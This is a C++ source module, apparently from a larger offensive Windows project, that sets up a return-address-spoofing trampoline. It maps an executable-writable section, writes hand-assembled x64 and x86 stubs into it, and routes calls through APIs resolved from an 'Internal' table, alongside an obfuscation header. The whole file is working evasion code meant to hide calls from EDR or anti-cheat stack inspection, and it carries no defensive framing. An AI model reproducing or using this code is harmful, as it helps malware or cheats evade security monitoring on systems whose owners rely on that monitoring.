#include "StackSpoof.h"
#include "Internal.h"
#include "Obfuscation.h"
#include "../../DebugLog.h"
#include <windows.h>
namespace StackSpoof {
    static HANDLE  g_hSection     = NULL;
    static LPVOID  g_pTrampoline  = NULL;
    static LPVOID  g_targetFunc   = NULL;
    static bool    g_initialized  = false;
    static const SIZE_T TARGET_OFFSET    = 64;
    static const SIZE_T SAVED_RET_OFFSET = TARGET_OFFSET + 8;  
    bool Init() {
        if (g_initialized) return true;
        if (!Internal::_CreateFileMappingA || !Internal::_MapViewOfFile) {
            SLOG("[STACKSPOOF] Init FAILED: CreateFileMappingA=%p MapViewOfFile=%p",
                 Internal::_CreateFileMappingA, Internal::_MapViewOfFile);
            return false;
        }
#ifndef FILE_MAP_EXECUTE
#define FILE_MAP_EXECUTE 0x0020
#endif
        g_hSection = Internal::_CreateFileMappingA(
            INVALID_HANDLE_VALUE, NULL, PAGE_EXECUTE_READWRITE,
            0, 0x1000, NULL);
        if (!g_hSection) { SLOG("[STACKSPOOF] CreateFileMappingA FAILED"); return false; }
        SLOG("[STACKSPOOF] Section handle=%p", g_hSection);
        g_pTrampoline = Internal::_MapViewOfFile(g_hSection,
            FILE_MAP_WRITE | FILE_MAP_READ | FILE_MAP_EXECUTE,
            0, 0, 0x1000);
        if (!g_pTrampoline) { SLOG("[STACKSPOOF] MapViewOfFile FAILED"); return false; }
        SLOG("[STACKSPOOF] Trampoline mapped at %p", g_pTrampoline);
        volatile unsigned char* vp = (volatile unsigned char*)g_pTrampoline;
        for (int i = 0; i < 0x1000; i++) vp[i] = 0;
        *(LPVOID*)((BYTE*)g_pTrampoline + TARGET_OFFSET) = NULL;
#ifdef _WIN64
        unsigned char stub[] = {
            0x41, 0x5B,                                     
            0x4C, 0x89, 0x1D, 0x00, 0x00, 0x00, 0x00,     
            0x48, 0x8B, 0x05, 0x00, 0x00, 0x00, 0x00,     
            0x4C, 0x8D, 0x1D, 0x00, 0x00, 0x00, 0x00,     
            0x41, 0x53,                                     
            0xFF, 0xE0,                                     
            0xFF, 0x25, 0x00, 0x00, 0x00, 0x00             
        };
        INT32 disp_save_ret = (INT32)(SAVED_RET_OFFSET - 9);   
        INT32 disp_target   = (INT32)(TARGET_OFFSET - 16);      
        INT32 disp_ret_lbl  = (INT32)(27 - 23);                 
        INT32 disp_jmp_back = (INT32)(SAVED_RET_OFFSET - 33);  
        memcpy(stub + 5,  &disp_save_ret, 4);
        memcpy(stub + 12, &disp_target, 4);
        memcpy(stub + 19, &disp_ret_lbl, 4);
        memcpy(stub + 29, &disp_jmp_back, 4);
        memcpy(g_pTrampoline, stub, sizeof(stub));
#else
        DWORD targetAbsAddr = (DWORD)((BYTE*)g_pTrampoline + TARGET_OFFSET);
        DWORD savedRetAddr  = (DWORD)((BYTE*)g_pTrampoline + TARGET_OFFSET + 4);
        DWORD retLabelAddr  = (DWORD)((BYTE*)g_pTrampoline + 14); 
        unsigned char stub[] = {
            0x59,                                       
            0x89, 0x0D, 0x00, 0x00, 0x00, 0x00,       
            0x68, 0x00, 0x00, 0x00, 0x00,              
            0xFF, 0x25, 0x00, 0x00, 0x00, 0x00,        
            0xFF, 0x25, 0x00, 0x00, 0x00, 0x00         
        };
        retLabelAddr = (DWORD)((BYTE*)g_pTrampoline + 18);
        memcpy(stub + 3,  &savedRetAddr, 4);   
        memcpy(stub + 8,  &retLabelAddr, 4);   
        memcpy(stub + 14, &targetAbsAddr, 4);  
        memcpy(stub + 20, &savedRetAddr, 4);   
        memcpy(g_pTrampoline, stub, sizeof(stub));
#endif
        g_initialized = true;
        SLOG("[STACKSPOOF] Init OK — trampoline at %p", g_pTrampoline);
        return true;
    }
    LPVOID GetTrampoline() {
        return g_pTrampoline;
    }
    void SetTarget(LPVOID func) {
        *(LPVOID*)((BYTE*)g_pTrampoline + TARGET_OFFSET) = func;
    }
}
